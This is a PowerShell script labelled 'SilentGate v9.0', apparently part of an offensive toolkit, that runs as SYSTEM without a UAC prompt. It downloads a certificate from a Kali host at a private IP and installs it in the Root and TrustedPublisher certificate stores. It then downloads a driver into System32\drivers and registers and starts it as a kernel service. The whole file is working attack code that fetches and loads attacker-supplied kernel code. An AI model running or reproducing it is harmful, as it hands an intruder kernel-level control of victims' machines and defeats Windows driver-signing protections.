# SilentGate v9.0 - Load kernel driver via Task Scheduler (SYSTEM)
# Author: JarDani
# Runs as SYSTEM - no UAC needed
# Downloads and loads sg_driver.sys from Kali

$drv_url  = "http://192.168.217.146:8080/output/v9/sg_driver_signed.sys"
$cert_url = "http://192.168.217.146:8080/output/v9/sg_test.crt"
$drv_path = "C:\Windows\System32\drivers\sgdrv.sys"
$cert_path = "C:\Windows\Temp\sg_test.crt"

# Download cert and install
(New-Object System.Net.WebClient).DownloadFile($cert_url, $cert_path)
certutil -addstore "TrustedPublisher" $cert_path | Out-Null
certutil -addstore "Root" $cert_path | Out-Null

# Download driver
(New-Object System.Net.WebClient).DownloadFile($drv_url, $drv_path)

# Load driver via sc.exe
sc.exe create SilentGate binPath= $drv_path type= kernel start= demand
sc.exe start SilentGate

# Write success marker
"DRIVER_LOADED" | Out-File "C:\Windows\Temp\sg_status.txt"
